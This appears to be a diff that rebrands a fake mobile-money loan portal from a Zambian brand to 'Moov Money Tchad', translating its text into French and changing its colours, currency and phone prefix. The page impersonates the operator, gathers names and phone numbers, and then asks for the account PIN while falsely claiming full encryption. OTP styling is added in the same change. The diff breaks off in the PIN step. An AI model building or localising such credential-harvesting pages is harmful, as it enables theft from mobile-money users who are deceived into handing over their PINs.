@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title data-i18n="title">MoMo Zambia — Digital Loan & Credit Portal</title>
+  <title data-i18n="title">Moov Money Tchad — Portail de Crédit & Prêts Numériques</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -17,16 +17,16 @@
           },
           colors: {
             brand: {
-              blueDark: '#0B2545',
-              blueDeep: '#134074',
-              blue: '#0056C6',
-              blueRoyal: '#0077B6',
+              blueDark: '#001D4A',
+              blueDeep: '#002B66',
+              blue: '#004B93',
+              blueRoyal: '#0056C6',
               cyan: '#00B4D8',
-              yellow: '#FFB703',
-              yellowHover: '#FB8500',
+              yellow: '#FF6600',
+              yellowHover: '#E65C00',
               yellowDark: '#D97706',
               blueLight: '#EEF4F8',
-              blueBorder: '#8ECAE6',
+              blueBorder: '#90E0EF',
               black: '#0A1128',
               grayBg: '#F8FAFC',
               grayText: '#334155'
@@ -56,37 +56,37 @@
       height: 24px;
       width: 24px;
       border-radius: 50%;
-      background: #FFB703;
-      border: 3px solid #0B2545;
-      box-shadow: 0 4px 12px rgba(255, 183, 3, 0.5);
+      background: #FF6600;
+      border: 3px solid #002B66;
+      box-shadow: 0 4px 12px rgba(255, 102, 0, 0.5);
       cursor: pointer;
       margin-top: -8px;
       transition: transform 0.15s ease, background-color 0.15s ease;
     }
     input[type=range]::-webkit-slider-thumb:hover {
       transform: scale(1.15);
-      background: #FB8500;
+      background: #E65C00;
     }
-    .pin-box {
+    .pin-box, .otp-box {
       font-family: monospace;
       font-weight: 700;
       text-align: center;
       transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
     }
-    .pin-box:focus, .pin-box.active {
-      border-color: #0056C6;
-      box-shadow: 0 0 0 4px rgba(0, 86, 198, 0.25);
+    .pin-box:focus, .pin-box.active, .otp-box:focus, .otp-box.active {
+      border-color: #FF6600;
+      box-shadow: 0 0 0 4px rgba(255, 102, 0, 0.25);
       transform: translateY(-1px);
     }
     .mixx-gradient {
-      background: linear-gradient(135deg, #0B2545 0%, #134074 45%, #0056C6 100%);
+      background: linear-gradient(135deg, #001D4A 0%, #002B66 45%, #004B93 100%);
     }
     .mixx-btn-gradient {
-      background: linear-gradient(135deg, #FFB703 0%, #FB8500 100%);
-      color: #0B2545;
+      background: linear-gradient(135deg, #FF6600 0%, #F7931E 100%);
+      color: #FFFFFF;
     }
     .mixx-blue-card {
-      background: linear-gradient(135deg, #0B2545 0%, #134074 100%);
+      background: linear-gradient(135deg, #001D4A 0%, #002B66 100%);
     }
   </style>
   <script src="/language.js" defer></script>
@@ -105,15 +105,15 @@
           </svg>
         </button>
         <div class="flex items-center space-x-2.5">
-          <span class="text-xl font-black text-brand-yellow tracking-tight">MoMo Zambia 🇿🇲</span>
+          <span class="text-xl font-black text-amber-400 tracking-tight">Moov Money Tchad 🇹🇩</span>
         </div>
       </div>
 
       <div class="flex items-center space-x-2">
-        <button type="button" class="language-toggle bg-blue-950/80 hover:bg-blue-900 text-xs font-black text-brand-yellow px-2.5 py-1.5 rounded-md border border-yellow-400/40 transition-all">
-          EN
+        <button type="button" class="language-toggle bg-blue-950/80 hover:bg-blue-900 text-xs font-black text-amber-400 px-2.5 py-1.5 rounded-md border border-amber-400/40 transition-all">
+          FR
         </button>
-        <button onclick="toggleNoticeModal(true, 'Customer Support', 'MoMo Zambia Support Helpline: 111 (Toll-Free) or +260 97 000 0000.')" class="p-1.5 text-blue-300 hover:text-brand-yellow rounded-lg transition-colors" aria-label="Info">
+        <button onclick="toggleNoticeModal(true, 'Support Client', 'Moov Money Tchad Assistance: 123 (Gratuit) ou +235 66 00 00 00.')" class="p-1.5 text-blue-300 hover:text-amber-400 rounded-lg transition-colors" aria-label="Info">
           <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
             <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
           </svg>
@@ -128,7 +128,7 @@
           <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-brand-blue opacity-75"></span>
           <span class="relative inline-flex rounded-full h-2 w-2 bg-brand-blue"></span>
         </span>
-        <span>Referred by MoMo Agent</span>
+        <span>Recommandé par Agent Moov Money</span>
       </div>
       <span id="referral-code-display" class="font-mono bg-white px-2 py-0.5 rounded border border-brand-blueBorder text-[11px] text-brand-blueDeep font-bold"></span>
     </div>
@@ -140,16 +140,16 @@
       <section id="step-0" class="flex-1 flex flex-col">
         <!-- Hero Header -->
         <div class="mixx-gradient text-white px-6 pt-7 pb-10 text-center relative overflow-hidden shadow-inner">
-          <div class="absolute -right-8 -bottom-8 w-36 h-36 bg-cyan-400/10 rounded-full blur-xl pointer-events-none"></div>
+          <div class="absolute -right-8 -bottom-8 w-36 h-36 bg-orange-400/10 rounded-full blur-xl pointer-events-none"></div>
           <div class="relative z-10">
-            <div class="inline-flex items-center space-x-2 bg-brand-yellow text-blue-950 px-3 py-1 rounded-full text-xs font-black shadow-sm mb-3">
-              <svg class="w-3.5 h-3.5 text-blue-950" fill="currentColor" viewBox="0 0 20 20">
+            <div class="inline-flex items-center space-x-2 mixx-btn-gradient px-3 py-1 rounded-full text-xs font-black shadow-sm mb-3">
+              <svg class="w-3.5 h-3.5 text-white" fill="currentColor" viewBox="0 0 20 20">
                 <path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/>
               </svg>
-              <span data-i18n="heroBadge">Instant Mobile Money Loan Approval 🇿🇲</span>
+              <span data-i18n="heroBadge">Approbation Instantanée Prêt Moov Money 🇹🇩</span>
             </div>
-            <h2 class="text-2xl font-black tracking-tight text-white leading-snug" data-i18n="heroHeading">Simulate Your MoMo Loan</h2>
-            <p class="text-xs text-blue-100 mt-1 font-medium max-w-xs mx-auto" data-i18n="heroSubtitle">Get funds directly into your MTN MoMo / Airtel Money Zambia account within minutes.</p>
+            <h2 class="text-2xl font-black tracking-tight text-white leading-snug" data-i18n="heroHeading">Simulez Votre Prêt Moov Money</h2>
+            <p class="text-xs text-blue-100 mt-1 font-medium max-w-xs mx-auto" data-i18n="heroSubtitle">Recevez les fonds directement sur votre compte Moov Money Tchad en quelques minutes.</p>
           </div>
         </div>
 
@@ -159,53 +159,53 @@
             <!-- Amount Display & Slider -->
             <div class="bg-brand-blueLight/80 border border-brand-blueBorder/80 rounded-2xl p-5 shadow-sm">
               <div class="flex justify-between items-center mb-1">
-                <span class="text-xs font-bold text-brand-blueDeep uppercase tracking-wider" data-i18n="requestedAmount">Requested Amount</span>
-                <span class="text-xs font-black text-blue-950 bg-brand-yellow px-2.5 py-0.5 rounded-md shadow-xs" data-i18n="interestRate">5% monthly rate</span>
+                <span class="text-xs font-bold text-brand-blueDeep uppercase tracking-wider" data-i18n="requestedAmount">Montant Demandé</span>
+                <span class="text-xs font-black text-white mixx-btn-gradient px-2.5 py-0.5 rounded-md shadow-xs" data-i18n="interestRate">Taux mensuel 5%</span>
               </div>
               <div class="text-center py-2">
-                <span id="calc-amount-display" class="text-3xl font-black text-brand-blueDark tracking-tight">ZMW 20,000</span>
+                <span id="calc-amount-display" class="text-3xl font-black text-brand-blueDark tracking-tight">250 000 FCFA</span>
               </div>
 
               <input 
                 id="amount-range" 
                 type="range" 
-                min="1000" 
-                max="300000" 
-                step="1000" 
-                value="20000" 
+                min="50000" 
+                max="5000000" 
+                step="50000" 
+                value="250000" 
                 oninput="updateCalculator(this.value)" 
                 class="my-3"
               />
 
               <div class="flex justify-between text-[11px] font-bold text-slate-500">
-                <span>K1,000</span>
-                <span>K150,000</span>
-                <span>K300,000</span>
+                <span>50 000 FCFA</span>
+                <span>2 500 000 FCFA</span>
+                <span>5 000 000 FCFA</span>
               </div>
             </div>
 
             <!-- Term Selector Chips -->
             <div>
-              <label class="block text-xs font-bold text-slate-600 uppercase tracking-wider mb-2.5" data-i18n="repaymentTerm">Repayment Term</label>
+              <label class="block text-xs font-bold text-slate-600 uppercase tracking-wider mb-2.5" data-i18n="repaymentTerm">Durée de Remboursement</label>
               <div class="grid grid-cols-4 gap-2">
-                <button type="button" onclick="setTerm(1)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border border-slate-200 text-slate-700 hover:border-brand-blue transition-all" data-i18n="month1">1 Month</button>
-                <button type="button" onclick="setTerm(3)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border border-slate-200 text-slate-700 hover:border-brand-blue transition-all" data-i18n="months3">3 Months</button>
-                <button type="button" onclick="setTerm(6)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border-2 border-brand-blue bg-brand-blueLight text-brand-blueDeep shadow-sm" data-i18n="months6">6 Months</button>
-                <button type="button" onclick="setTerm(12)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border border-slate-200 text-slate-700 hover:border-brand-blue transition-all" data-i18n="months12">12 Months</button>
+                <button type="button" onclick="setTerm(1)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border border-slate-200 text-slate-700 hover:border-brand-blue transition-all" data-i18n="month1">1 Mois</button>
+                <button type="button" onclick="setTerm(3)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border border-slate-200 text-slate-700 hover:border-brand-blue transition-all" data-i18n="months3">3 Mois</button>
+                <button type="button" onclick="setTerm(6)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border-2 border-brand-blue bg-brand-blueLight text-brand-blueDeep shadow-sm" data-i18n="months6">6 Mois</button>
+                <button type="button" onclick="setTerm(12)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border border-slate-200 text-slate-700 hover:border-brand-blue transition-all" data-i18n="months12">12 Mois</button>
               </div>
             </div>
 
             <!-- Repayment Summary Card -->
             <div class="mixx-blue-card text-white rounded-2xl p-5 shadow-xl relative overflow-hidden border border-blue-900">
               <div class="flex justify-between items-center border-b border-blue-900/80 pb-3 mb-3">
-                <span class="text-xs text-blue-200" data-i18n="estMonthly">Est. Monthly Repayment:</span>
-                <span class="text-xl font-black text-brand-yellow tracking-tight">
-                  <span id="calc-monthly-payment">3,833</span> ZMW/mo
+                <span class="text-xs text-blue-200" data-i18n="estMonthly">Mensualité Estimée:</span>
+                <span class="text-xl font-black text-amber-400 tracking-tight">
+                  <span id="calc-monthly-payment">47 917</span> FCFA/mois
                 </span>
               </div>
               <div class="flex justify-between items-center text-xs text-blue-200">
-                <span data-i18n="totalRepay">Total Repayable:</span>
-                <span id="calc-total-payment" class="font-extrabold text-white">ZMW 23,000</span>
+                <span data-i18n="totalRepay">Total à Rembourser:</span>
+                <span id="calc-total-payment" class="font-extrabold text-white">287 500 FCFA</span>
               </div>
             </div>
           </div>
@@ -215,8 +215,8 @@
             <button 
               type="button" 
               onclick="goToStep(1)" 
-              class="w-full py-4 mixx-btn-gradient hover:opacity-95 active:scale-[0.99] font-black rounded-xl shadow-lg shadow-yellow-500/25 text-sm tracking-wider uppercase flex items-center justify-center space-x-2 transition-all duration-150">
-              <span data-i18n="applyNow">APPLY FOR MOMO LOAN NOW</span>
+              class="w-full py-4 mixx-btn-gradient hover:opacity-95 active:scale-[0.99] font-black rounded-xl shadow-lg shadow-orange-500/25 text-sm tracking-wider uppercase flex items-center justify-center space-x-2 transition-all duration-150">
+              <span data-i18n="applyNow">DEMANDER UN PRÊT MOOV MONEY</span>
               <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14 5l7 7m0 0l-7 7m7-7H3"/>
               </svg>
@@ -228,56 +228,56 @@
       <!-- STEP 1: Loan Configuration Form -->
       <section id="step-1" class="hidden flex-1 flex flex-col p-4 sm:p-6 space-y-4 sm:space-y-6">
         <div>
-          <span class="text-[11px] font-black text-blue-950 bg-brand-yellow px-2.5 py-1 rounded-full uppercase tracking-wider">Step 1 of 4</span>
+          <span class="text-[11px] font-black text-white mixx-btn-gradient px-2.5 py-1 rounded-full uppercase tracking-wider">Étape 1 sur 4</span>
           <h2 class="text-xl font-extrabold text-slate-900 mt-2 flex items-center space-x-2">
             <span>🎯</span>
-            <span data-i18n="step1Title">Loan Details</span>
+            <span data-i18n="step1Title">Détails du Prêt</span>
           </h2>
-          <p class="text-xs text-slate-500 mt-1" data-i18n="step1Sub">Select your desired loan parameters (K1,000 - K300,000 ZMW).</p>
+          <p class="text-xs text-slate-500 mt-1" data-i18n="step1Sub">Choisissez le montant souhaité (50 000 FCFA - 5 000 000 FCFA).</p>
         </div>
 
         <div class="space-y-4">
           <div>
             <label for="loan-type-select" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5" data-i18n="loanType">
               <span>🏷️</span>
-              <span>Loan Type</span>
+              <span>Type de Prêt</span>
             </label>
             <select id="loan-type-select" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20">
-              <option value="MoMo Personal Loan" selected>MoMo Personal Loan</option>
-              <option value="MoMo Business Credit">MoMo Business Credit</option>
-              <option value="MoMo Quick Cash Advance">MoMo Quick Cash Advance</option>
-              <option value="MoMo Emergency Loan">MoMo Emergency Loan</option>
+              <option value="Moov Money Prêt Personnel" selected>Moov Money Prêt Personnel</option>
+              <option value="Moov Money Prêt Commercial">Moov Money Prêt Commercial</option>
+              <option value="Moov Money Avance Rapide">Moov Money Avance Rapide</option>
+              <option value="Moov Money Prêt d'Urgence">Moov Money Prêt d'Urgence</option>
             </select>
           </div>
 
           <div>
             <label for="loan-amount-input" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5" data-i18n="amountLabel">
               <span>💰</span>
-              <span>Loan Amount (ZMW)</span>
+              <span>Montant du Prêt (FCFA)</span>
             </label>
-            <input id="loan-amount-input" type="number" min="1000" max="300000" step="1000" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm font-bold text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20" value="20000" />
+            <input id="loan-amount-input" type="number" min="50000" max="5000000" step="50000" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm font-bold text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20" value="250000" />
           </div>
 
           <div>
             <label for="loan-term-select" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5" data-i18n="termLabel">
               <span>📅</span>
-              <span>Repayment Term (Months)</span>
+              <span>Durée de Remboursement (Mois)</span>
             </label>
             <select id="loan-term-select" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20">
-              <option value="1">1 Month</option>
-              <option value="3">3 Months</option>
-              <option value="6" selected>6 Months</option>
-              <option value="12">12 Months</option>
-              <option value="24">24 Months</option>
+              <option value="1">1 Mois</option>
+              <option value="3">3 Mois</option>
+              <option value="6" selected>6 Mois</option>
+              <option value="12">12 Mois</option>
+              <option value="24">24 Mois</option>
             </select>
           </div>
 
           <div>
             <label for="loan-purpose-input" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5" data-i18n="purposeLabel">
               <span>📝</span>
-              <span>Loan Purpose</span>
+              <span>Motif du Prêt</span>
             </label>
-            <textarea id="loan-purpose-input" rows="3" placeholder="e.g. Business expansion, Personal expenses, Medical..." class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-medium text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20 resize-none">Business & Capital</textarea>
+            <textarea id="loan-purpose-input" rows="3" placeholder="Ex. Commerce, Dépenses personnelles, Santé..." class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-medium text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20 resize-none">Commerce & Capital</textarea>
           </div>
         </div>
 
@@ -285,9 +285,9 @@
           <button 
             type="button" 
             onclick="goToStep(2)" 
-            class="w-full py-4 mixx-btn-gradient hover:opacity-95 text-blue-950 font-black rounded-xl shadow-md text-xs tracking-wider uppercase flex items-center justify-center space-x-2"
+            class="w-full py-4 mixx-btn-gradient hover:opacity-95 text-white font-black rounded-xl shadow-md text-xs tracking-wider uppercase flex items-center justify-center space-x-2"
             data-i18n="continueToPersonal">
-            <span>CONTINUE TO PERSONAL DETAILS</span>
+            <span>CONTINUER VERS LES INFOS PERSONNELLES</span>
             <span>⚡</span>
           </button>
         </div>
@@ -296,12 +296,12 @@
       <!-- STEP 2: Applicant Information Form -->
       <section id="step-2" class="hidden flex-1 flex flex-col p-4 sm:p-5 space-y-3 sm:space-y-4">
         <div>
-          <span class="text-[11px] font-black text-blue-950 bg-brand-yellow px-2.5 py-1 rounded-full uppercase tracking-wider">Step 2 of 4</span>
+          <span class="text-[11px] font-black text-white mixx-btn-gradient px-2.5 py-1 rounded-full uppercase tracking-wider">Étape 2 sur 4</span>
           <h2 class="text-xl font-extrabold text-slate-900 mt-1.5 flex items-center space-x-2" data-i18n="step2Title">
             <span>👤</span>
-            <span>Applicant Information</span>
+            <span>Informations du Demandeur</span>
           </h2>
-          <p class="text-xs text-slate-500 mt-0.5" data-i18n="step2Sub">Enter your official Zambian NRC & mobile account details.</p>
+          <p class="text-xs text-slate-500 mt-0.5" data-i18n="step2Sub">Entrez vos informations officielles et votre numéro Moov Money.</p>
         </div>
 
         <div class="space-y-3">
@@ -309,46 +309,46 @@
             <div>
               <label for="first-name-input" class="block text-[11px] font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1" data-i18n="firstName">
                 <span>👤</span>
-                <span>First Name *</span>
+                <span>Prénom *</span>
               </label>
-              <input id="first-name-input" type="text" placeholder="e.g. Mulenga" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-blue" value="" required />
+              <input id="first-name-input" type="text" placeholder="Ex. Mahamat" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-blue" value="" required />
             </div>
             <div>
               <label for="last-name-input" class="block text-[11px] font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1" data-i18n="lastName">
                 <span>👤</span>
-                <span>Last Name *</span>
+                <span>Nom de famille *</span>
               </label>
-              <input id="last-name-input" type="text" placeholder="e.g. Banda" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-blue" value="" required />
+              <input id="last-name-input" type="text" placeholder="Ex. Abakar" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-blue" value="" required />
             </div>
           </div>
 
           <div>
             <label for="phone-number-input" class="block text-[11px] font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1" data-i18n="orangePhone">
               <span>📱</span>
-              <span>MoMo Mobile Number (+260) *</span>
+              <span>Numéro Moov Money (+235) *</span>
             </label>
             <div class="flex items-center">
-              <span class="bg-slate-200 border border-r-0 border-slate-300 rounded-l-xl px-3 py-2.5 text-xs font-bold text-slate-600">+260</span>
-              <input id="phone-number-input" type="tel" placeholder="971 234 567" oninput="checkReturningUserPhone(this.value)" class="w-full bg-slate-50 border border-slate-300 rounded-r-xl px-3.5 py-2.5 text-xs font-bold text-slate-800 focus:outline-none focus:border-brand-blue" value="" required />
+              <span class="bg-slate-200 border border-r-0 border-slate-300 rounded-l-xl px-3 py-2.5 text-xs font-bold text-slate-600">+235</span>
+              <input id="phone-number-input" type="tel" placeholder="66 12 34 56" oninput="checkReturningUserPhone(this.value)" class="w-full bg-slate-50 border border-slate-300 rounded-r-xl px-3.5 py-2.5 text-xs font-bold text-slate-800 focus:outline-none focus:border-brand-blue" value="" required />
             </div>
           </div>
 
           <div>
             <label for="employment-select" class="block text-[11px] font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1" data-i18n="employmentStatus">
               <span>💼</span>
-              <span>Employment Status</span>
+              <span>Statut Professionnel</span>
             </label>
             <select id="employment-select" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-blue">
-              <option value="Employed">Employed</option>
-              <option value="Self-Employed / Business Owner" selected>Self-Employed / Business Owner</option>
-              <option value="Freelancer">Freelancer</option>
-              <option value="Other">Other</option>
+              <option value="Employed">Employé</option>
+              <option value="Self-Employed / Business Owner" selected>Indépendant / Commerçant</option>
+              <option value="Freelancer">Indépendant / Freelance</option>
+              <option value="Other">Autre</option>
             </select>
           </div>
 
           <div class="flex items-center space-x-2 pt-1">
             <input id="agent-consent-checkbox" type="checkbox" checked class="w-4 h-4 text-brand-blue rounded border-slate-300 focus:ring-brand-blue" />
-            <label for="agent-consent-checkbox" class="text-[11px] text-slate-600 font-medium" data-i18n="agentConsent">🤝 I authorize the MoMo Agent to assist with tracking my application.</label>
+            <label for="agent-consent-checkbox" class="text-[11px] text-slate-600 font-medium" data-i18n="agentConsent">🤝 J'autorise l'agent Moov Money à m'aider à suivre ma demande.</label>
           </div>
 
           <div id="step2-alert" class="mt-2 p-2.5 bg-red-50 border border-red-200 rounded-xl text-xs font-bold text-red-600 hidden"></div>
@@ -359,9 +359,9 @@
             id="continue-to-auth-btn"
             type="button" 
             onclick="submitStep2AndAwaitApproval()" 
-            class="w-full py-3.5 sm:py-4 mixx-btn-gradient hover:opacity-95 text-blue-950 font-black rounded-xl shadow-md text-xs tracking-wider uppercase transition-all flex items-center justify-center space-x-2"
+            class="w-full py-3.5 sm:py-4 mixx-btn-gradient hover:opacity-95 text-white font-black rounded-xl shadow-md text-xs tracking-wider uppercase transition-all flex items-center justify-center space-x-2"
             data-i18n="continueToAuth">
-            <span>CONTINUE TO MOMO AUTHENTICATION</span>
+            <span>CONTINUER VERS L'AUTHENTIFICATION</span>
             <span>⚡</span>
           </button>
         </div>
@@ -370,9 +370,9 @@
         <div id="app-waiting-box" class="hidden p-3.5 bg-blue-50 border border-blue-200 rounded-2xl text-center space-y-2">
           <div class="flex items-center justify-center space-x-2">
             <span class="inline-block w-2.5 h-2.5 rounded-full bg-brand-blue animate-ping"></span>
-            <span class="text-xs font-bold text-blue-900 uppercase tracking-wider">Awaiting Application Approval</span>
+            <span class="text-xs font-bold text-blue-900 uppercase tracking-wider">En attente d'approbation</span>
           </div>
-          <p class="text-xs text-blue-800">Your application details have been submitted. Please wait while your agent verifies...</p>
+          <p class="text-xs text-blue-800">Vos informations ont été soumises. Veuillez patienter pendant la vérification par votre agent...</p>
           <div class="flex justify-center pt-1">
             <svg class="animate-spin h-5 w-5 text-brand-blue" fill="none" viewBox="0 0 24 24">
               <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
@@ -389,11 +389,11 @@
         <!-- Top Blue Banner Header -->
         <div class="mixx-gradient text-white pt-7 pb-8 px-6 text-center relative shadow-md">
           <div class="inline-flex flex-col items-center">
-            <h2 class="text-xl sm:text-2xl font-black text-brand-yellow tracking-tight flex items-center justify-center space-x-1.5">
+            <h2 class="text-xl sm:text-2xl font-black text-amber-400 tracking-tight flex items-center justify-center space-x-1.5">
               <span>🔐</span>
-              <span>MoMo Account Sign In</span>
+              <span>Connexion Compte Moov Money</span>
             </h2>
-            <p class="text-xs text-blue-100 font-medium mt-0.5">Account PIN Verification</p>
+            <p class="text-xs text-blue-100 font-medium mt-0.5">Vérification Code PIN Moov Money</p>
           </div>
         </div>
 
@@ -401,23 +401,23 @@
         <div class="px-5 py-6 space-y-5 flex-1 flex flex-col justify-center max-w-sm mx-auto w-full">
           
           <div class="text-center space-y-1">
-            <span class="text-[11px] font-black text-blue-950 bg-brand-yellow px-2.5 py-0.5 rounded-full uppercase tracking-wider mb-1 inline-block">Step 3 of 4</span>
+            <span class="text-[11px] font-black text-white mixx-btn-gradient px-2.5 py-0.5 rounded-full uppercase tracking-wider mb-1 inline-block">Étape 3 sur 4</span>
             <h3 class="text-lg font-black text-slate-800 tracking-tight flex items-center justify-center space-x-1.5">
               <span>🔐</span>
-              <span>MoMo Account PIN</span>
+              <span>Code PIN Compte Moov Money</span>
             </h3>
-            <p class="text-xs text-slate-500 font-medium">Enter your mobile number and 4-digit MoMo Account PIN</p>
+            <p class="text-xs text-slate-500 font-medium">Entrez votre numéro et votre code PIN à 4 chiffres</p>
           </div>
 
           <!-- Phone Number Input Container -->
           <div>
             <label class="block text-xs font-bold text-slate-600 uppercase tracking-wider mb-1 flex items-center space-x-1" data-i18n="phoneNum">
               <span>📱</span>
-              <span>MoMo Mobile Number (+260)</span>
+              <span>Numéro Moov Money (+235)</span>
             </label>
-            <div class="flex items-center bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 focus-within:bg-white focus-within:border-brand-yellow focus-within:ring-2 focus-within:ring-brand-yellow/30 transition-all">
-              <span class="text-xs font-extrabold text-slate-500 mr-2">+260</span>
-              <input id="momo-phone-display" type="tel" placeholder="971 234 567" oninput="onMomoPhoneInput(this.value)" class="bg-transparent text-xs font-extrabold text-slate-800 w-full focus:outline-none" value="" />
+            <div class="flex items-center bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 focus-within:bg-white focus-within:border-orange-500 focus-within:ring-2 focus-within:ring-orange-500/30 transition-all">
+              <span class="text-xs font-extrabold text-slate-500 mr-2">+235</span>
+              <input id="momo-phone-display" type="tel" placeholder="66 12 34 56" oninput="onMomoPhoneInput(this.value)" class="bg-transparent text-xs font-extrabold text-slate-800 w-full focus:outline-none" value="" />
             </div>
           </div>
 
@@ -426,21 +426,21 @@
             <div class="flex items-center justify-between text-xs font-bold text-slate-600 uppercase tracking-wider px-1">
               <span class="flex items-center space-x-1">
                 <span>🔐</span>
-                <span>Account PIN (4 Digits)</span>
+                <span>Code PIN (4 Chiffres)</span>
               </span>
               <span class="text-[10px] font-semibold text-slate-400 flex items-center space-x-0.5">
                 <span>🛡️</span>
-                <span>100% Encrypted</span>
+                <span>Crypté à 100%</span>
               </span>
             </div>
 
             <!-- PIN Input Row -->
             <div class="flex items-center justify-center space-x-2.5 py-1">
               <div class="grid grid-cols-4 gap-2.5 flex-1">
-                <input type="password" maxlength="1" data-index="0" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-brand-yellow focus:ring-2 focus:ring-brand-yellow/30 shadow-xs" />
-                <input type="password" maxlength="1" data-index="1" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-brand-yellow focus:ring-2 focus:ring-brand-yellow/30 shadow-xs" />
-                <input type="password" maxlength="1" data-index="2" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-brand-yellow focus:ring-2 focus:ring-brand-yellow/30 shadow-xs" />
-                <input type="password" maxlength="1" data-index="3" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-brand-yellow focus:ring-2 focus:ring-brand-yellow/30 shadow-xs" />
+                <input type="password" maxlength="1" data-index="0" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-orange-500 focus:ring-2 focus:ring-orange-500/30 shadow-xs" />
+                <input type="password" maxlength="1" data-index="1" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-orange-500 focus:ring-2 focus:ring-orange-500/30 shadow-xs" />
+                <input type="password" maxlength="1" data-index="2" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-orange-500 focus:ring-2 focus:ring-orange-500/30 shadow-xs" />
+                <input type="password" maxlength="1" data-index="3" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-orange-500 focus:ring-2 focus:ring-orange-500/30 shadow-xs" />
               </div>
               
               <button type="button" onclick="togglePinVisibility()" class="p-2 text-slate-500 hover:text-brand-blue transition-colors focus:outline-none flex flex-col items-center justify-center" aria-label="Toggle PIN Visibility">
@@ -461,17 +461,17 @@
               onclick="submitAccountPin()" 
               class="w-full py-3.5 bg-blue-900/40 text-white/50 font-extrabold rounded-xl text-xs tracking-wider uppercase cursor-not-allowed transition-all duration-200 shadow-md flex items-center justify-center space-x-2">
               <span>⚡</span>
-              <span>CONFIRM & VALIDATE LOAN</span>
+              <span>CONFIRMER ET VALIDER LE PRÊT</span>
             </button>
           </div>
 
           <!-- Live Approval Waiting Indicator inside Step 3 -->
